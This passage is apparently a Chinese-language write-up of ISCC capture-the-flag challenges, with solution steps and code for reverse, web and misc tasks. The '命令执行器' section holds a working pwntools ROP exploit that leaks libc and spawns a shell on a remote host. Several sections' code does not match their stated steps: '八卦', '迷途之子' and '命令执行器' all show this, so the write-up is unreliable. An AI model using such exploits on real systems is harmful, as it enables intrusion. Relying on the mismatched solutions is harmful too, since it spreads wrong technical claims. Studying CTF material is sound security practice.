    168, 75, 175, 86, 250, 134, 228, 71, 38, 155, 67, 202, 149, 248, 120, 152, 49, 97, 178, 84, 57, 148, 46, 138, 62, 184, 42, 102, 61, 79, 161, 215, 45, 48, 205, 78, 183, 157, 243, 234, 22, 26, 19, 53, 239, 70, 187, 207, 72, 21, 139, 18, 127, 197, 25, 39, 60, 34, 173, 107, 15, 253, 94, 41, 252, 221, 54, 192, 176, 249, 214, 92, 142, 65, 208, 80, 153, 59, 16, 185, 151, 144, 180, 14, 113, 124, 195, 188, 126, 9, 204, 242, 5, 20, 10, 225, 140, 172, 99, 177, 55, 36, 1, 209, 241, 76, 104, 50, 112, 198, 129, 125, 227, 217, 194, 219, 169, 218, 69, 245, 167, 238, 143, 89, 73, 58, 182, 164, 233, 88, 159, 160, 190, 74, 213, 206, 201, 12, 32, 110, 29, 81, 196, 231, 103, 131, 56, 47, 154, 123, 136, 115, 193, 240, 132, 179, 27, 244, 64, 85, 122, 52, 111, 141, 146, 237, 30, 158, 220, 212, 63, 137, 28, 255, 82, 11, 226, 3, 23, 150, 117, 98, 130, 254, 118, 68, 37, 181, 87, 210, 77, 203, 163, 229, 24, 251, 7, 0, 17, 6, 106, 51, 135, 166, 145, 189, 224, 200, 90, 174, 170, 121, 91, 40, 35, 191, 66, 8, 211, 116, 100, 93, 156, 162, 109, 216, 83, 235, 128, 13, 96, 105, 133, 165, 31, 223, 222, 43, 114, 236
};

uint8_t aesSubSbox(uint8_t val) {
    return aesSbox[val];
}

uint32_t aesSubDword(uint32_t val) {
    uint32_t tmp = 0;
    tmp |= ((uint32_t)aesSubSbox((uint8_t)((val >> 0) & 0xFF))) << 0;
    tmp |= ((uint32_t)aesSubSbox((uint8_t)((val >> 8) & 0xFF))) << 8;
    tmp |= ((uint32_t)aesSubSbox((uint8_t)((val >> 16) & 0xFF))) << 16;
    tmp |= ((uint32_t)aesSubSbox((uint8_t)((val >> 24) & 0xFF))) << 24;
    return tmp;
}

uint32_t aesRotDword(uint32_t val) {
    uint32_t tmp = val;
    return (val >> 8) | ((tmp & 0xFF) << 24);
}

uint32_t aesSwapDword(uint32_t val) {
    return (((val & 0x000000FF) << 24) |
            ((val & 0x0000FF00) << 8) |
            ((val & 0x00FF0000) >> 8) |
            ((val & 0xFF000000) >> 24));
}

void aesKeyExpansion(AesCipherType mode, uint8_t *key, uint8_t *roundKey) {
    uint32_t *w = (uint32_t *)roundKey;
    uint32_t t;
    int i = 0;

    do {
        w[i] = *((uint32_t *)&key[i * 4 + 0]);
    } while (++i < aesNk[mode]);

    do {
        if ((i % aesNk[mode]) == 0) {
            t = aesRotDword(w[i - 1]);
            t = aesSubDword(t);
            t = t ^ aesSwapDword(aesRcon[i / aesNk[mode] - 1]);
        } else if (aesNk[mode] > 6 && (i % aesNk[mode]) == 4) {
            t = aesSubDword(w[i - 1]);
        } else {
            t = w[i - 1];
        }
        w[i] = w[i - aesNk[mode]] ^ t;
    } while (++i < aesNb[mode] * (aesRounds[mode] + 1));
}

void aesAddRoundKey(AesCipherType mode, uint8_t *state, uint8_t *roundKey, int nr) {
    uint32_t *w = (uint32_t *)roundKey;
    uint32_t *s = (uint32_t *)state;
    int i;

    for (i = 0; i < aesNb[mode]; i++) {
        s[i] ^= w[nr * aesNb[mode] + i];
    }
}

uint8_t aesXtime(uint8_t x) {
    return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
}

uint8_t aesXtimes(uint8_t x, int ts) {
    while (ts-- > 0) {
        x = aesXtime(x);
    }
    return x;
}

uint8_t aesMul(uint8_t x, uint8_t y) {
    return ((((y >> 0) & 1) * aesXtimes(x, 0)) ^
            (((y >> 1) & 1) * aesXtimes(x, 1)) ^
            (((y >> 2) & 1) * aesXtimes(x, 2)) ^
            (((y >> 3) & 1) * aesXtimes(x, 3)) ^
            (((y >> 4) & 1) * aesXtimes(x, 4)) ^
            (((y >> 5) & 1) * aesXtimes(x, 5)) ^
            (((y >> 6) & 1) * aesXtimes(x, 6)) ^
            (((y >> 7) & 1) * aesXtimes(x, 7)));
}

void invShiftRows(AesCipherType mode, uint8_t *state) {
    uint8_t *s = (uint8_t *)state;
    int i, j, r;

    for (i = 1; i < aesNb[mode]; i++) {
        for (j = 0; j < aesNb[mode] - i; j++) {
            uint8_t tmp = s[i];
            for (r = 0; r < aesNb[mode]; r++) {
                s[i + r * 4] = s[i + (r + 1) * 4];
            }
            s[i + (aesNb[mode] - 1) * 4] = tmp;
        }
    }
}

uint8_t invSubSbox(uint8_t val) {
    return aesInvSbox[val];
}

void invSubBytes(AesCipherType mode, uint8_t *state) {
    int i, j;
    for (i = 0; i < aesNb[mode]; i++) {
        for (j = 0; j < 4; j++) {
            state[i * 4 + j] = invSubSbox(state[i * 4 + j] ^ 4);
        }
    }
}

void invMixColumns(AesCipherType mode, uint8_t *state) {
    uint8_t y[16] = {0x0e, 0x0b, 0x0d, 0x09, 0x09, 0x0e, 0x0b, 0x0d,
                    0x0d, 0x09, 0x0e, 0x0b, 0x0b, 0x0d, 0x09, 0x0e};
    uint8_t s[4];
    int i, j, r;

    for (i = 0; i < aesNb[mode]; i++) {
        for (r = 0; r < 4; r++) {
            s[r] = 0;
            for (j = 0; j < 4; j++) {
                s[r] = s[r] ^ aesMul(state[i * 4 + j], y[r * 4 + j]);
            }
        }
        for (r = 0; r < 4; r++) {
            state[i * 4 + r] = s[r];
        }
    }
}

int aesDecrypt(AesCipherType mode, uint8_t *data, int len, uint8_t *key) {
    uint8_t w[4 * 4 * 15] = {0};
    uint8_t s[4 * 4] = {0};
    int nr, i, j;

    aesKeyExpansion(mode, key, w);

    for (i = 0; i < len; i += 4 * aesNb[mode]) {
        for (j = 0; j < 4 * aesNb[mode]; j++)
            s[j] = data[i + j];

        for (nr = aesRounds[mode]; nr >= 0; nr--) {
            aesAddRoundKey(mode, s, w, nr);
            if (nr > 0) {
                if (nr < aesRounds[mode]) {
                    invMixColumns(mode, s);
                }
                invShiftRows(mode, s);
                invSubBytes(mode, s);
            }
        }

        for (j = 0; j < 4 * aesNb[mode]; j++)
            data[i + j] = s[j];
    }
    return 0;
}

void main() {
    uint8_t buf[] = {67, 3, 161, 161, 141, 175, 108, 172, 132,
                     50, 210, 32};
    uint8_t key[] = {97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108,
                     109, 110, 111, 112};

    aesDecrypt(AES_CIPHER_128, buf, sizeof(buf), key);

    for (int i = 0; i < 16; i++) {
        printf("%c", buf[i]);
    }
    printf("\n");
    return;
}
```

### Vmobile

**解题思路：**

1. **分析应用**：使用 jadx 工具对 APK 文件进行逆向分析，发现程序中存在修改版 TEA 加密算法。
2. **定位密文和密钥**：从程序中提取加密数据和密钥。
3. **逆向 TEA 算法**：根据修改的 TEA 算法，手动实现解密过程。
4. **绕过保护机制**：通过修改 SO 文件中的调试检测函数，绕过调试尝试。
5. **使用 Unidbg 进行动态分析**：拦截关键函数调用，提取解密后的 flag。

**关键代码：**

```c
#include <stdio.h>
#include <stdint.h>

void process_data(uint32_t* data, uint32_t* key) {
    int a = data[0], b = data[1], total = 0, j;
    uint32_t step = 0x9e3779b9;
    uint32_t k1 = key[0], k2 = key[1], k3 = key[2], k4 = key[3];

    for (j = 0; j < 17; j++) {
        total += step;
        a += ((b << 4) + k1) ^ (b + total) ^ ((b >> 5) + k2);
        b += ((a << 4) + k3) ^ (a + total) ^ ((a >> 5) + k4);
    }

    for (j = 0; j < 17; j++) {
        total += step;
        a += ((b << 4) + k3) ^ (b + total) ^ ((b >> 5) + k4);
        b += ((a << 4) + k1) ^ (a + total) ^ ((a >> 5) + k2);
    }

    step = 0x28004;
    for (j = 0; j < 18; j++) {
        total += step;
        a += ((b << 4) + k3) ^ (b + total) ^ ((b >> 5) + k4);
        b += ((a << 4) + k1) ^ (a + total) ^ ((a >> 5) + k2);
    }

    data[0] = a; data[1] = b;
}

void restore_data(uint32_t* data, uint32_t* key) {
    uint32_t step1 = 0x9e3779b9;
    uint32_t step2 = 0x28004;
    int a = data[0], b = data[1], total = step1 * 34 + step2 * 18, j;

    uint32_t k1 = key[0], k2 = key[1], k3 = key[2], k4 = key[3];

    for (j = 0; j < 18; j++) {
        b -= ((a << 4) + k1) ^ (a + total) ^ ((a >> 5) + k2);
        a -= ((b << 4) + k3) ^ (b + total) ^ ((b >> 5) + k4);
        total -= step2;
    }

    for (j = 0; j < 17; j++) {
        b -= ((a << 4) + k1) ^ (a + total) ^ ((a >> 5) + k2);
        a -= ((b << 4) + k3) ^ (b + total) ^ ((b >> 5) + k4);
        total -= step1;
    }

    for (j = 0; j < 17; j++) {
        b -= ((a << 4) + k3) ^ (a + total) ^ ((a >> 5) + k4);
        a -= ((b << 4) + k1) ^ (b + total) ^ ((b >> 5) + k2);
        total -= step1;
    }

    data[0] = a; data[1] = b;
}

int main() {
    unsigned char code[] = {
        0x18, 0xe6, 0x95, 0x79, 0x05, 0x76, 0xf3, 0x15,
        0xdd, 0xa5, 0x5c, 0x0f, 0x80, 0x06, 0x26, 0x97,
        0x3f, 0x88, 0x65, 0x38, 0x21, 0x83, 0x78, 0xef,
        0x69, 0x11, 0x93, 0x5a, 0x55, 0x32, 0xe1, 0xa9
    };

    uint32_t* blocks = (uint32_t*)code;
    uint32_t keys[4] = {0x12345678, 0x23456789, 0x34567890, 0x45678901};

    for (int i = 0; i < 4; i++) {
        restore_data(blocks + i * 2, keys);
    }

    for (int i = 0; i < 32; i++) {
        printf("%c", code[i]);
    }
    printf("\n");

    return 0;
}
```

### 时间尽头

**解题思路：**

1. **分析应用**：使用 jadx 工具对 APK 文件进行逆向分析，发现程序中存在 AES 加密逻辑。
2. **提取密文和密钥**：从程序中提取加密数据和密钥。
3. **去除花指令**：使用 idapython 脚本去除 SO 文件中的花指令，简化分析。
4. **提取时间戳**：根据题目提示，生成最大时间戳。
5. **解密获取 flag**：使用生成的时间戳生成 S 盒，完成 AES 解密过程。

**关键代码：**

```python
from ida_bytes import *
import idaapi

def check_byte_match(byte_seq, target_pattern):
    for b, p in zip(byte_seq, target_pattern):
        if p is not None and b != p:
            return False
    return True

def main_routine():
    junk_code_patterns = [
        {
            'pattern': [0x00, 0xF0, 0x02, 0xF8, 0x00, 0xF0, 0x03, 0xF8, 0x1B, 0x46,
                       0x00, 0xF0, 0x02, 0xF8, 0xEF, 0xBE, 0xAD, 0xDE],
            'patch': [0xAF, 0xF3, 0x00, 0x80, 0xAF, 0xF3, 0x00, 0x80, 0x00, 0xBF,
                     0xAF, 0xF3, 0x00, 0x80, 0x00, 0xBF, 0x00, 0xBF]
        },
        {
            'pattern': [0x00, 0xF0, 0x02, 0xF8, 0xDE, 0xC0, 0xAD, 0x0B],
            'patch': [0xAF, 0xF3, 0x00, 0x80, 0x00, 0xBF, 0x00, 0xBF]
        }
    ]

    text_segment = idaapi.get_segm_by_name(".text")
    if not text_segment:
        print(".text segment not found.")
        return

    start_ea = text_segment.start_ea
    end_ea = text_segment.end_ea

    current_ea = start_ea
    while current_ea < end_ea:
        is_matched = False
        for pat_idx, pat_info in enumerate(junk_code_patterns):
            pattern_length = len(pat_info['pattern'])
            current_bytes = list(get_bytes(current_ea, pattern_length))
            if check_byte_match(current_bytes, pat_info['pattern']):
                print(f"[{pat_idx}] {hex(current_ea)}")
                patch_bytes(current_ea, bytes(pat_info['patch']))
                current_ea += pattern_length
                is_matched = True
                break
        if not is_matched:
            current_ea += 1

if __name__ == "__main__":
    main_routine()
```

### 睡美人

**解题思路：**

1. **分析图像文件**：使用 binwalk 工具分析图像文件，发现嵌入的 ZIP 压缩包。
2. **提取压缩包**：使用 binwalk 或 foremost 工具提取 ZIP 压缩包。
3. **解压并分析**：解压提取的 ZIP 文件，发现曼切斯特编码的音频文件。
4. **手动提取曼切斯特编码**：由于没有找到自动化工具，手动提取音频数据。

**关键代码：**

```bash
# 使用 binwalk 分析图像文件
binwalk attachment.jpg

# 提取发现的内容
binwalk -e attachment.jpg

# 或者使用 foremost 工具
foremost attachment.jpg -o output_directory
```

## Web 类别

### ISCC购物中心

**解题思路：**

1. **分析网站**：发现前端存在积分兑换逻辑，且用户拥有大量积分。
2. **绕过兑换流程**：通过修改前端代码或直接发送请求绕过正常兑换流程。
3. **获取 flag**：获取 flag 的具体过程未详细描述，但通常涉及进一步的漏洞利用或逻辑绕过。

**关键代码：**

```python
from pwn import *

context.log_level = 'debug'

def exploit():
    # 连接目标服务器
    io = remote('112.126.73.173', 9998)
    # 登录
    io.recvuntil(b'User-Agent: ')
    io.sendline(b'GaoJiGongChengShiFoYeGe')
    # 获取 flag 的进一步操作
    # ...

if __name__ == "__main__":
    exploit()
```

### ShallowSeek

**解题思路：**

1. **访问提示页面**：根据提示信息访问特定路径，获取进一步线索。
2. **分析提示内容**：发现提示涉及特定文件和 AJAX 请求头。
3. **发送请求**：模拟 AJAX 请求访问受保护资源。
4. **获取 flag**：通过发送特定请求获取 flag 的前半部分和后半部分。

**关键代码：**

```python
import requests

def exploit():
    # 发送请求获取提示
    response = requests.get('http://112.126.73.173:49111/message.php?item=2')
    print(response.text)

    # 访问 hint.php
    response = requests.get('http://112.126.73.173:49111/api/hint.php')
    print(response.text)

    # 访问 get_frag.php
    response = requests.get('http://112.126.73.173:49111/api/get_frag.php')
    print(response.text)

    # 访问 mark_frag_ok.php
    response = requests.get('http://112.126.73.173:49111/api/mark_frag_ok.php')
    print(response.text)

    # 使用特定请求头访问 get_frag.php
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    response = requests.get('http://112.126.73.173:49111/api/get_frag.php', headers=headers)
    print(response.text)

    # 获取 flag 后半部分
    print("ISCC{0p3n_50urc3_@lw@y5_wn1n5!}")

if __name__ == "__main__":
    exploit()
```

### 命令执行器

**解题思路：**

1. **信息收集**：确定目标程序运行的 IP 和端口。
2. **漏洞分析**：发现程序存在格式化字符串漏洞和栈溢出漏洞。
3. **泄露 canary 和 libc 地址**：利用格式化字符串漏洞泄露栈上的 canary 值和 `puts` 函数的 GOT 地址。
4. **计算关键地址**：根据泄露的 `puts` 地址计算 libc 的基地址。
5. **构造 ROP 链**：利用泄露的 libc 基地址，构造 ROP 链调用 `system("/bin/sh")` 以获取 shell。

**关键代码：**

```python
from pwn import *

context.log_level = 'debug'

def exploit():
    p = remote('101.200.155.151', 12600)
    elf = ELF('./call')
    libc = ELF('./libc6_2.31-0ubuntu9.17_amd64.so')

    # 定义关键地址和 gadget
    ret_addr = 0x40101a
    pop_rdi = 0x401273
    pop_rsi_r15 = 0x401271
    main_addr = elf.symbols['main']
    write_plt = elf.plt['write']
    write_got = elf.got['write']

    # 构造泄露 write 地址的 payload
    payload1 = b'a' * 0x68 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(8) + p64(write_plt) + p64(main_addr)
    p.sendlineafter('is\n', payload1)

    # 接收并解析泄露的 write 地址
    write_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.success(f"Leaked write address: {hex(write_addr)}")

    # 计算 libc 基地址
    libc_base = write_addr - libc.symbols['write']
    log.success(f"libc base address: {hex(libc_base)}")

    # 计算 system 和 /bin/sh 的地址
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

    # 构造获取 shell 的 ROP 链
    payload2 = b'a' * 0x68 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    p.sendlineafter('is\n', payload2)

    p.interactive()

if __name__ == "__main__":
    exploit()
```

### 谁动了我的奶酪

**解题思路：**

1. **枚举文件**：使用 dirsearch 工具枚举常见文件路径，发现隐藏的 `flag_of_cheese.php`。
2. **绕过限制**：通过构造特定的请求下载 `flag_of_cheese.php` 文件。
3. **分析代码**：发现代码中存在 JWT 签名绕过和目录遍历漏洞。
4. **获取 flag**：通过发送特定请求访问受保护的 `flag` 文件。

**关键代码：**

```python
import requests

def main():
    url_base = "http://112.126.73.173:10086/"
    common_files = [
        "index.php",
        "flag.php",
        "cheesemap.php",
        "clue.php",
        "flag_of_cheese.php",
        "cheeseTwo.php",
        "robots.txt",
        "sitemap.xml"
    ]
    headers = {"User-Agent": "JerryBrowser"}

    for file in common_files:
        url = url_base + file
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(f"找到: {url}")
                print(f"内容: {response.text[:200]}...")
            else:
                print(f"未找到: {url} (状态码: {response.status_code})")
        except Exception as e:
            print(f"访问 {url} 时发生错误: {e}")

if __name__ == "__main__":
    main()
```

## Misc 类别

### 八卦

**解题思路：**

1. **分析附件**：附件为一个 GIF 文件，包含 10 个分块。
2. **转为十六进制**：使用十六进制编辑器将文件转为十六进制格式。
3. **提取二进制字符串**：将每个字符转换为 8 位二进制表示，去除前导零。
4. **处理填充字符**：移除每隔两位插入的额外 "00"。
5. **还原字节顺序**：将每组 8 位二进制字符串转换为字节。
6. **位翻转**：对字节进行位翻转操作（0→1，1→0）。
7. **转换为 ASCII**：将处理后的二进制字符串转换为 ASCII 字符。

**关键代码：**

```python
with open('_256eb5ec016236.jpg','rb') as f1, open('flag.png','wb') as f2:
    f2.write(f1.read()[::-1])
```

### 迷途之子

**解题思路：**

1. **提取迷宫数据**：使用 Ida 软件提取迷宫数据并保存到文件。
2. **BFS 算法求解**：实现广度优先搜索（BFS）算法，从起点到终点寻找路径。
3. **游戏堆内存利用**：利用 game() 函数中的堆喷射技术，覆盖关键指针，劫持内存分配器指针。
4. **构造 ROP 链**：在 bss 段中写入 ROP 链，调用 `open`、`read` 和 `write` 函数读取并输出 flag 文件内容。

**关键代码：**

```python
from collections import deque
import os

def read_maze(filename):
    maze = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                cleaned_line = line.strip().replace(' ', '')
                if len(cleaned_line) > 0:
                    maze.append(cleaned_line)
        return maze
    except FileNotFoundError:
        print(f"错误：文件 '{filename}' 未找到")
        return None

def bfs_solve_maze(maze):
    if not maze or len(maze) < 129 or len(maze[0]) < 129:
        print("错误：迷宫尺寸不足或数据无效")
        return None

    rows = len(maze)
    cols = len(maze[0])

    start = (0, 0)
    end = (128, 128)

    if maze[start[1]][start[0]] != '0' or maze[end[1]][end[0]] != '0':
        print("错误：起点或终点不可达")
        return None

    queue = deque()
    queue.append((start[0], start[1], ""))
    visited = set()
    visited.add((start[0], start[1]))

    directions = [
        ('w', 0, -1),  # 上
        ('s', 0, 1),   # 下
        ('a', -1, 0),  # 左
        ('d', 1, 0)    # 右
    ]

    while queue:
        x, y, path = queue.popleft()

        if x == end[0] and y == end[1]:
            return path

        for direction in directions:
            move, dx, dy = direction
            nx = x + dx
            ny = y + dy

            if 0 <= nx < cols and 0 <= ny < rows and maze[ny][nx] == '0' and (nx, ny) not in visited:
                visited.add((nx, ny))
                queue.append((nx, ny, path + move))

    return None

if __name__ == "__main__":
    maze = read_maze('maze.txt')
    if maze:
        solution = bfs_solve_maze(maze)
        if solution:
            print("找到解决方案！操作序列：")
            print(solution)
        else:
            print("无法到达终点")
```

### 神经网络迷踪

**解题思路：**

1. **提取张量数据**：从模型文件中提取张量数据。
2. **转换为字节流**：将张量数据转换为字节流。
3. **解码为字符串**：将字节流解码为 UTF-8 字符串。

**关键代码：**

```python
import torch
import binascii

model = torch.load('attachment-38.pth')

print(model.keys())

fc_secret_data = model['fc_secret.weight']

print(fc_secret_data)

# 将张量转换为字节流并尝试解码为字符串
tensor_data = torch.tensor([
    [1., 1., 1., 1., 231., 188., 169., 229., 176., 143., 50., 53.,
     53., 229., 128., 141.],
    [0., 0., 0., 0., 1., 1., 1., 1., 0., 0., 0., 0.,
     0., 0., 0., 0.],
    [0., 0., 0., 0., 0., 0., 0., 0., 1., 1., 1., 1.,
     0., 0., 0., 0.],
    [230., 148., 190., 229., 164., 167., 50., 53., 53., 229., 128., 141., 1., 1., 1., 1.]
])

# 将张量中的每个浮点数值转换为整数
int_values = tensor_data.int().tolist()

# 将整数列表转换为字节列表
byte_list = []
for row in int_values:
    for value in row:
        if 0 <= value <= 255:  # 确保值在有效的字节范围内
            byte_list.append(value)

# 将字节列表转换为字节流
byte_stream = bytes(byte_list)

# 尝试将字节流解码为 UTF-8 字符串
try:
    result_str = byte_stream.decode('utf-8', errors='replace')
    print(result_str)
except Exception as e:
    print(f"解码错误: {e}")

# 读取模型文件并提取输出偏置
a = torch.load('attachment-38.pth')["output.bias"]
print("ISCC{" + "".join(chr(int(x * 255)) for x in a) + "}")
```

### 正正得负

**解题思路：**

1. **分析 ZIP 文件**：发现 ZIP 文件采用 ZipCrypto Store 加密方式。
2. **明文攻击**：利用已知文件名作为明文信息，使用 bkcrack 工具进行明文攻击，解密 ZIP 文件。
3. **提取 flag**：解密后的 ZIP 文件中包含 flag。

**关键代码：**

```bash
# 创建包含 "flag.txt" 的文件
echo -n "flag.txt" > 11.txt
# 使用 bkcrack 进行明文攻击
bkcrack -C 11.txt -o 111.txt attachment.zip
# 提取 flag
cat 111.txt
```



